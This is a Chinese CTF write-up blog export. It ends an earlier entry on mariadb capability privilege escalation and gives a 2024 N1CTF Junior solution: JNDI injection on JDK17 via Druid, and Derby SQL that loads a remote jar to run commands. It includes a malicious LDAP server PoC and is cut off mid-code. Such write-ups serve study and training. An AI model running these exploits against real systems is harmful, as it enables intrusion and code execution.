data-language="bash"><code class="language-bash"><span class="token function">find</span> / <span class="token parameter variable">-user</span> root <span class="token parameter variable">-perm</span> <span class="token parameter variable">-4000</span> <span class="token parameter variable">-print</span> <span class="token operator"><span class="token file-descriptor important">2</span>></span>/dev/nullgetcap <span class="token parameter variable">-r</span> / <span class="token operator"><span class="token file-descriptor important">2</span>></span>/dev/null</code></pre><pre class="language-bash" data-language="bash"><code class="language-bash">/usr/bin/mariadb <span class="token assign-left variable">cap_setfcap</span><span class="token operator">=</span>ep</code></pre><p>可以看到 <code>/usr/bin/mariadb</code> 有 <code>cap_setfcap</code> 权限<br>也就是我们能给其他文件设置 <code>cap</code><br>给 mariadb 写个插件</p><pre class="language-cpp" data-language="cpp"><code class="language-cpp"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdlib.h></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdio.h></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;sys/types.h></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;unistd.h></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;sys/capability.h></span></span><span class="token keyword">void</span> <span class="token function">lshell</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    cap_t caps <span class="token operator">=</span> <span class="token function">cap_from_text</span><span class="token punctuation">(</span><span class="token string">"cap_dac_override=eip"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">cap_set_file</span><span class="token punctuation">(</span><span class="token string">"/bin/cat"</span><span class="token punctuation">,</span> caps<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"setcap finished\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">class</span> <span class="token class-name">LIN</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">public</span><span class="token operator">:</span>        <span class="token function">LIN</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>            <span class="token function">lshell</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span>LIN _mysql_client_plugin_declaration_<span class="token punctuation">;</span></code></pre><pre class="language-bash" data-language="bash"><code class="language-bash">g++ cap.cpp <span class="token parameter variable">-shared</span> <span class="token parameter variable">-fPIC</span> <span class="token parameter variable">-o</span> cap.so <span class="token parameter variable">-lcap2</span></code></pre><p>将编译出来的文件传到靶机,<br>然后加载这个 so 让 <code>/bin/cat</code> 获取 <code>cap_dac_override</code>（忽略文件权限）的特权</p><pre class="language-bash" data-language="bash"><code class="language-bash">mariadb --plugin-dir<span class="token operator">=</span>. --default-auth<span class="token operator">=</span>cap<span class="token function">cat</span> /flag_4</code></pre>]]></content>
      
      
      <categories>
          
          <category> Write Up </category>
          
      </categories>
      
      
        <tags>
            
            <tag> PHP </tag>
            
            <tag> Java </tag>
            
            <tag> SQL </tag>
            
            <tag> Linux </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>2024 N1CTF Junior WriteUp</title>
      <link href="/write-up/2024-n1ctf-junior-writeup/"/>
      <url>/write-up/2024-n1ctf-junior-writeup/</url>
      
        <content type="html"><![CDATA[<blockquote><p>这场挂了个<code>默认战队名</code>的ID打，拿到了Web单项的第二名（打不过大B哥qwq），两个Java题分别拿到了一血和二血，有点意外</p></blockquote><h1 id="排行榜"><a href="#排行榜" class="headerlink" title="排行榜"></a>排行榜</h1><p><a href="https://ctf.junior.nu1l.com/2024.html">https://ctf.junior.nu1l.com/2024.html</a></p><p><img src="image-1.png" alt="image-1.png"></p><h1 id="Derby-🩸-452PT"><a href="#Derby-🩸-452PT" class="headerlink" title="Derby 🩸 | 452PT"></a>Derby 🩸 | 452PT</h1><h2 id="题目描述"><a href="#题目描述" class="headerlink" title="题目描述"></a>题目描述</h2><pre class="language-none"><code class="language-none">我再也不用 Java 8 了 😭Hint：Druid 绕过高版本 JDK 打 Derby RCE, 善用搜索引擎</code></pre><h2 id="解题过程"><a href="#解题过程" class="headerlink" title="解题过程"></a>解题过程</h2><p>IndexController.java</p><pre class="language-java" data-language="java"><code class="language-java"><span class="token annotation punctuation">@RequestMapping</span><span class="token punctuation">(</span><span class="token punctuation">&#123;</span><span class="token string">"/lookup"</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span>  <span class="token keyword">public</span> <span class="token class-name">String</span> <span class="token function">lookup</span><span class="token punctuation">(</span><span class="token annotation punctuation">@RequestParam</span> <span class="token class-name">String</span> url<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">Exception</span> <span class="token punctuation">&#123;</span>    <span class="token class-name">Context</span> ctx <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">InitialContext</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    ctx<span class="token punctuation">.</span><span class="token function">lookup</span><span class="token punctuation">(</span>url<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> <span class="token string">"ok"</span><span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span></code></pre><p>在 <code>IndexController</code> 处可以发现 <code>/lookup</code> 路由存在 jndi 注入漏洞</p><p>pom.xml</p><pre class="language-markup" data-language="markup"><code class="language-markup">···    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>properties</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>java.version</span><span class="token punctuation">></span></span>17<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>java.version</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>properties</span><span class="token punctuation">></span></span>···    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>dependency</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>groupId</span><span class="token punctuation">></span></span>com.alibaba<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>groupId</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>artifactId</span><span class="token punctuation">></span></span>druid<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>artifactId</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>version</span><span class="token punctuation">></span></span>1.2.21<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>version</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>dependency</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>dependency</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>groupId</span><span class="token punctuation">></span></span>org.apache.derby<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>groupId</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>artifactId</span><span class="token punctuation">></span></span>derby<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>artifactId</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>version</span><span class="token punctuation">></span></span>10.14.2.0<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>version</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>dependency</span><span class="token punctuation">></span></span>···</code></pre><p>结合题目描述可知这是在 jdk17 高版本环境下的 jndi 注入，<br>并且可以发现 jar 包内引入了两个关键依赖项：</p><ul><li>com.alibaba.druid：JDBC 组件库，包含数据库连接池</li><li>org.apache.derby：基于 Java 的嵌入式关系型数据库</li></ul><p>结合 Hint：<code>Druid 绕过高版本 JDK 打 Derby RCE</code> 可知，需要使用 JDBC池化</p><blockquote><p>JDBC 池是一种用于管理 Java 应用程序中的数据库连接的机制。</p><p>在 JDBC 池中，预先创建并维护一组数据库连接，以供应用程序使用。当应用程序需要访问数据库时，它会从池中请求一个连接，当它使用完连接后，会将它返回到池中而不是关闭它。这使应用程序能够重用现有连接并避免每次需要访问数据库时创建新连接的开销。</p></blockquote><p>在 <a href="https://xz.aliyun.com/t/10656">JNDI jdk高版本绕过——Druid</a> 中，我们发现了类似的实现：</p><pre class="language-java" data-language="java"><code class="language-java"><span class="token keyword">try</span><span class="token punctuation">&#123;</span>    <span class="token class-name">Registry</span> registry <span class="token operator">=</span> <span class="token class-name">LocateRegistry</span><span class="token punctuation">.</span><span class="token function">createRegistry</span><span class="token punctuation">(</span><span class="token number">8883</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token class-name">Reference</span> ref <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Reference</span><span class="token punctuation">(</span><span class="token string">"javax.sql.DataSource"</span><span class="token punctuation">,</span><span class="token string">"com.alibaba.druid.pool.DruidDataSourceFactory"</span><span class="token punctuation">,</span><span class="token keyword">null</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token class-name">String</span> <span class="token constant">JDBC_URL</span> <span class="token operator">=</span> <span class="token string">"jdbc:h2:mem:test;MODE=MSSQLServer;init=CREATE TRIGGER shell3 BEFORE SELECT ON\n"</span> <span class="token operator">+</span>    <span class="token string">"INFORMATION_SCHEMA.TABLES AS $$//javascript\n"</span> <span class="token operator">+</span>    <span class="token string">"java.lang.Runtime.getRuntime().exec('cmd /c calc.exe')\n"</span> <span class="token operator">+</span>    <span class="token string">"$$\n"</span><span class="token punctuation">;</span>    <span class="token class-name">String</span> <span class="token constant">JDBC_USER</span> <span class="token operator">=</span> <span class="token string">"root"</span><span class="token punctuation">;</span>    <span class="token class-name">String</span> <span class="token constant">JDBC_PASSWORD</span> <span class="token operator">=</span> <span class="token string">"password"</span><span class="token punctuation">;</span>    ref<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">StringRefAddr</span><span class="token punctuation">(</span><span class="token string">"driverClassName"</span><span class="token punctuation">,</span><span class="token string">"org.h2.Driver"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    ref<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">StringRefAddr</span><span class="token punctuation">(</span><span class="token string">"url"</span><span class="token punctuation">,</span><span class="token constant">JDBC_URL</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    ref<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">StringRefAddr</span><span class="token punctuation">(</span><span class="token string">"username"</span><span class="token punctuation">,</span><span class="token constant">JDBC_USER</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    ref<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">StringRefAddr</span><span class="token punctuation">(</span><span class="token string">"password"</span><span class="token punctuation">,</span><span class="token constant">JDBC_PASSWORD</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    ref<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">StringRefAddr</span><span class="token punctuation">(</span><span class="token string">"initialSize"</span><span class="token punctuation">,</span><span class="token string">"1"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    ref<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">StringRefAddr</span><span class="token punctuation">(</span><span class="token string">"init"</span><span class="token punctuation">,</span><span class="token string">"true"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token class-name">ReferenceWrapper</span> referenceWrapper <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ReferenceWrapper</span><span class="token punctuation">(</span>ref<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token class-name">Naming</span><span class="token punctuation">.</span><span class="token function">bind</span><span class="token punctuation">(</span><span class="token string">"rmi://localhost:8883/zlgExploit"</span><span class="token punctuation">,</span>referenceWrapper<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">catch</span><span class="token punctuation">(</span><span class="token class-name">Exception</span> e<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    e<span class="token punctuation">.</span><span class="token function">printStackTrace</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span></code></pre><p>由于高版本 jdk 限制了从远程的 Codebase 加载 Factory 类的能力，因此需要找到本地 CLASSPATH 中的类作为恶意的 Reference Factory 工厂类，并利用这个本地的 Factory 类执行命令。这个 Factory 类必须实现  <code>javax.naming.spi.ObjectFactory</code> 接口。</p><p>而在 <code>com.alibaba.druid</code> 中刚好存在 <code>DruidDataSourceFactory</code> 类满足条件，其实现了 <code>javax.naming.spi.ObjectFactory</code> 接口，可以被当做 JDBC 攻击的入口</p><img src="image-2.png" alt="image-2.png" width="80%" /><p>由于在 Java 17 环境中，不再允许对内部类进行反射访问，因此，不再可能在 <code>TemplatesImpl</code> 类上调用方法，程序不执行 Payload，而是抛出  <code>IllegalAccessException</code>，也无法使用<code>Jackson</code> 链，所以不能利用反序列化来实现后续过程</p><p>同时，由 <a href="https://blog.pyn3rd.com/2022/06/06/Make-JDBC-Attacks-Brillian-Again-I/">Make JDBC Attacks Brilliant Again I</a> 中可知，jdbc h2 数据库支持在创建时执行 init sql 语句，因此可以使用 h2 数据库所支持的 TRIGGER 触发任意代码执行</p><p><img src="image-3.png" alt="image-3.png"></p><p>因此我们只需要在 Derby 数据库中实现相同的路径即可</p><p>由于 Derby 数据库不支持在创建时通过 url 添加 init sql，而在 Druid 的 <code>DruidDataSourceFactory</code> 类中，我们发现了可以实现相似目的的属性 <code>initConnectionSqls</code></p><p><img src="image-4.png" alt="image-4.png"></p><p><img src="image-5.png" alt="image-5.png"></p><p>因此可以利用 Druid 中的 <code>initConnectionSqls</code> 属性来在创建 Derby 数据库时执行任意 sql 命令</p><p>最后就是在 Derby 数据库中寻找类似于 h2 数据库的通过 sql 语句进行 RCE 的方法</p><p>在 <a href="http://www.lvyyevd.cn/archives/derby-shu-ju-ku-ru-he-shi-xian-rce">derby数据库如何实现RCE</a> 中给出了满足条件的方法：</p><p>首先创建包含恶意 java 代码的 jar 包</p><p>test3.java</p><pre class="language-java" data-language="java"><code class="language-java"><span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>io<span class="token punctuation">.</span></span><span class="token class-name">IOException</span></span><span class="token punctuation">;</span><span class="token keyword">public</span> <span class="token keyword">class</span> testShell4 <span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">exec</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">IOException</span> <span class="token punctuation">&#123;</span>        <span class="token class-name">Runtime</span><span class="token punctuation">.</span><span class="token function">getRuntime</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">exec</span><span class="token punctuation">(</span><span class="token string">"cmd.exe /c calc"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span></code></pre><p>打包成 jar：</p><pre class="language-bash" data-language="bash"><code class="language-bash">javac test3.javajar <span class="token parameter variable">-cvf</span> test3.jar test3.class</code></pre><p>再在 Derby 数据库中使用 sql 语句远程加载恶意 jar 包实现 RCE</p><pre class="language-sql" data-language="sql"><code class="language-sql"><span class="token comment">## 导入一个类到数据库中</span><span class="token keyword">CALL</span> SQLJ<span class="token punctuation">.</span>INSTALL_JAR<span class="token punctuation">(</span><span class="token string">'http://127.0.0.1:8088/test3.jar'</span><span class="token punctuation">,</span> <span class="token string">'APP.Sample4'</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token comment">## 将这个类加入到derby.database.classpath，这个属性是动态的，不需要重启数据库</span><span class="token keyword">CALL</span> SYSCS_UTIL<span class="token punctuation">.</span>SYSCS_SET_DATABASE_PROPERTY<span class="token punctuation">(</span><span class="token string">'derby.database.classpath'</span><span class="token punctuation">,</span><span class="token string">'APP.Sample4'</span><span class="token punctuation">)</span><span class="token comment">## 创建一个PROCEDURE，EXTERNAL NAME 后面的值可以调用类的static类型方法</span><span class="token keyword">CREATE</span> <span class="token keyword">PROCEDURE</span> SALES<span class="token punctuation">.</span>TOTAL_REVENUES<span class="token punctuation">(</span><span class="token punctuation">)</span> PARAMETER STYLE JAVA <span class="token keyword">READS</span> <span class="token keyword">SQL</span> <span class="token keyword">DATA</span> <span class="token keyword">LANGUAGE</span> JAVA EXTERNAL NAME <span class="token string">'testShell4.exec'</span><span class="token comment">## 调用PROCEDURE</span><span class="token keyword">CALL</span> SALES<span class="token punctuation">.</span>TOTAL_REVENUES<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre><p>自此，我们就完成了通过 Druid 绕过高版本 JDK 打 Derby RCE 的全过程</p><h2 id="PoC"><a href="#PoC" class="headerlink" title="PoC"></a>PoC</h2><pre class="language-java" data-language="java"><code class="language-java"><span class="token comment">// LDAPServer.java</span><span class="token keyword">package</span> <span class="token namespace">com<span class="token punctuation">.</span>evil<span class="token punctuation">.</span>server</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">com<span class="token punctuation">.</span>unboundid<span class="token punctuation">.</span>ldap<span class="token punctuation">.</span>listener<span class="token punctuation">.</span></span><span class="token class-name">InMemoryDirectoryServer</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">com<span class="token punctuation">.</span>unboundid<span class="token punctuation">.</span>ldap<span class="token punctuation">.</span>listener<span class="token punctuation">.</span></span><span class="token class-name">InMemoryDirectoryServerConfig</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">com<span class="token punctuation">.</span>unboundid<span class="token punctuation">.</span>ldap<span class="token punctuation">.</span>listener<span class="token punctuation">.</span></span><span class="token class-name">InMemoryListenerConfig</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">com<span class="token punctuation">.</span>unboundid<span class="token punctuation">.</span>ldap<span class="token punctuation">.</span>listener<span class="token punctuation">.</span>interceptor<span class="token punctuation">.</span></span><span class="token class-name">InMemoryInterceptedSearchResult</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">com<span class="token punctuation">.</span>unboundid<span class="token punctuation">.</span>ldap<span class="token punctuation">.</span>listener<span class="token punctuation">.</span>interceptor<span class="token punctuation">.</span></span><span class="token class-name">InMemoryOperationInterceptor</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">com<span class="token punctuation">.</span>unboundid<span class="token punctuation">.</span>ldap<span class="token punctuation">.</span>sdk<span class="token punctuation">.</span></span><span class="token class-name">Entry</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">com<span class="token punctuation">.</span>unboundid<span class="token punctuation">.</span>ldap<span class="token punctuation">.</span>sdk<span class="token punctuation">.</span></span><span class="token class-name">LDAPResult</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">com<span class="token punctuation">.</span>unboundid<span class="token punctuation">.</span>ldap<span class="token punctuation">.</span>sdk<span class="token punctuation">.</span></span><span class="token class-name">ResultCode</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">javax<span class="token punctuation">.</span>net<span class="token punctuation">.</span></span><span class="token class-name">ServerSocketFactory</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">javax<span class="token punctuation">.</span>net<span class="token punctuation">.</span></span><span class="token class-name">SocketFactory</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">javax<span class="token punctuation">.</span>net<span class="token punctuation">.</span>ssl<span class="token punctuation">.</span></span><span class="token class-name">SSLSocketFactory</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>net<span class="token punctuation">.</span></span><span class="token class-name">InetAddress</span></span><span class="token punctuation">;</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">LDAPServer</span> <span class="token keyword">implements</span> <span class="token class-name">Runnable</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">private</span> <span class="token keyword">static</span> <span class="token class-name">String</span> ip<span class="token punctuation">;</span>    <span class="token keyword">private</span> <span class="token keyword">static</span> <span class="token keyword">int</span> port<span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token class-name">LDAPServer</span><span class="token punctuation">(</span><span class="token class-name">String</span> ip<span class="token punctuation">,</span> <span class="token keyword">int</span> port<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">this</span><span class="token punctuation">.</span>ip <span class="token operator">=</span> ip<span class="token punctuation">;</span>        <span class="token keyword">this</span><span class="token punctuation">.</span>port <span class="token operator">=</span> port<span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token annotation punctuation">@Override</span>    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">run</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">try</span> <span class="token punctuation">&#123;</span>            <span class="token class-name">InMemoryDirectoryServerConfig</span> config <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">InMemoryDirectoryServerConfig</span><span class="token punctuation">(</span><span class="token string">"dc=example,dc=com"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            config<span class="token punctuation">.</span><span class="token function">setListenerConfigs</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">InMemoryListenerConfig</span><span class="token punctuation">(</span>                    <span class="token string">"listen"</span><span class="token punctuation">,</span>                    <span class="token class-name">InetAddress</span><span class="token punctuation">.</span><span class="token function">getByName</span><span class="token punctuation">(</span><span class="token string">"0.0.0.0"</span><span class="token punctuation">)</span><span class="token punctuation">,</span>                    <span class="token keyword">this</span><span class="token punctuation">.</span>port<span class="token punctuation">,</span>                    <span class="token class-name">ServerSocketFactory</span><span class="token punctuation">.</span><span class="token function">getDefault</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span>                    <span class="token class-name">SocketFactory</span><span class="token punctuation">.</span><span class="token function">getDefault</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span>                    <span class="token punctuation">(</span><span class="token class-name">SSLSocketFactory</span><span class="token punctuation">)</span> <span class="token class-name">SSLSocketFactory</span><span class="token punctuation">.</span><span class="token function">getDefault</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>            <span class="token punctuation">)</span><span class="token punctuation">;</span>            config<span class="token punctuation">.</span><span class="token function">addInMemoryOperationInterceptor</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">OperationInterceptor</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token class-name">InMemoryDirectoryServer</span> ds <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">InMemoryDirectoryServer</span><span class="token punctuation">(</span>config<span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"[LDAP] Listening on "</span> <span class="token operator">+</span> <span class="token keyword">this</span><span class="token punctuation">.</span>ip <span class="token operator">+</span> <span class="token string">":"</span> <span class="token operator">+</span> <span class="token keyword">this</span><span class="token punctuation">.</span>port<span class="token punctuation">)</span><span class="token punctuation">;</span>            ds<span class="token punctuation">.</span><span class="token function">startListening</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">Exception</span> e<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            e<span class="token punctuation">.</span><span class="token function">printStackTrace</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">new</span> <span class="token class-name">Thread</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">LDAPServer</span><span class="token punctuation">(</span><span class="token string">"0.0.0.0"</span><span class="token punctuation">,</span> <span class="token number">1389</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">start</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">private</span> <span class="token keyword">static</span> <span class="token keyword">class</span> <span class="token class-name">OperationInterceptor</span> <span class="token keyword">extends</span> <span class="token class-name">InMemoryOperationInterceptor</span> <span class="token punctuation">&#123;</span>        <span class="token annotation punctuation">@Override</span>        <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">processSearchResult</span><span class="token punctuation">(</span><span class="token class-name">InMemoryInterceptedSearchResult</span> searchResult<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token class-name">String</span> base <span class="token operator">=</span> searchResult<span class="token punctuation">.</span><span class="token function">getRequest</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getBaseDN</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token class-name">Entry</span> e <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Entry</span><span class="token punctuation">(</span>base<span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token class-name">String</span> path <span class="token operator">=</span> <span class="token string">"/"</span> <span class="token operator">+</span> base<span class="token punctuation">.</span><span class="token function">split</span><span class="token punctuation">(</span><span class="token string">","</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">;</span>            <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"[LDAP] Send result for "</span> <span class="token operator">+</span> path<span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token class-name">Object</span> result <span class="token operator">=</span> <span class="token class-name">Dispatcher</span><span class="token punctuation">.</span><span class="token function">getInstance</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">service</span><span class="token punctuation">(</span>path<span class="token punctuation">)</span><span class="token punctuation">;</span>            e<span class="token punctuation">.</span><span class="token function">addAttribute</span><span class="token punctuation">(</span><span class="token string">"javaClassName"</span><span class="token punctuation">,</span> <span class="token string">"foo"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            e<span class="token punctuation">.</span><span class="token function">addAttribute</span><span class="token punctuation">(</span><span class="token string">"javaSerializedData"</span><span class="token punctuation">,</span> <span class="token class-name">SerializeUtil</span><span class="token punctuation">.</span><span class="token function">serialize</span><span class="token punctuation">(</span>result<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">try</span> <span class="token punctuation">&#123;</span>                searchResult<span class="token punctuation">.</span><span class="token function">sendSearchEntry</span><span class="token punctuation">(</span>e<span class="token punctuation">)</span><span class="token punctuation">;</span>                searchResult<span class="token punctuation">.</span><span class="token function">setResult</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">LDAPResult</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token class-name">ResultCode</span><span class="token punctuation">.</span><span class="token constant">SUCCESS</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">Exception</span> ex<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                ex<span class="token punctuation">.</span><span class="token function">printStackTrace</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span></code></pre><pre class="language-java" data-language="java"><code class="language-java"><span class="token comment">// SerializeUtil.java</span><span class="token keyword">package</span> <span class="token namespace">com<span class="token punctuation">.</span>evil<span class="token punctuation">.</span>server</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>io<span class="token punctuation">.</span></span><span class="token class-name">ByteArrayOutputStream</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>io<span class="token punctuation">.</span></span><span 